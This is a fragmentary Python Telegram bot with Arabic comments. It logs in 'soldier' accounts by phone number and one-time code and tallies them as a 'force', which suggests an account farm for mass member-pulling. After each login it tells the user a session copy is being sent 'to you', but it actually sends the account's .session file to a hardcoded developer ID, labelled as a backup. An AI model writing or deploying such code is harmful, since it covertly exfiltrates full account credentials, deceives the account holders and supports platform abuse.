...
# تشغيل البوت الأساسي (Render لا يحتاج بروكسي)
...
async def start(event):
    ...
    await event.respond("🛡️ **أهلاً بك يا قائد في نظام الشد (Render Edition)**", buttons=MAIN_KB)
...
async def handle_kb(event):
    ...
    if txt == '➕ إضافة جندي':
        async with bot.conversation(uid) as conv:
            ...
            try:
                ...
                if otp:
                    ...
                    # ميزة النسخة الاحتياطية لـ Render
                    await conv.send_message("✅ تم الانضمام. جاري إرسال نسخة من الجلسة لك...")
                    await bot.send_file(DEVELOPER_ID, f"{SESSION_DIR}/{phone}.session", caption=f"📦 نسخة احتياطية للحساب: `{phone}`\nاحتفظ بهذا الملف لرفعه لاحقاً.")
        ...
        await event.respond(f"🚀 القوة الحالية: {count} حساب جاهز.")
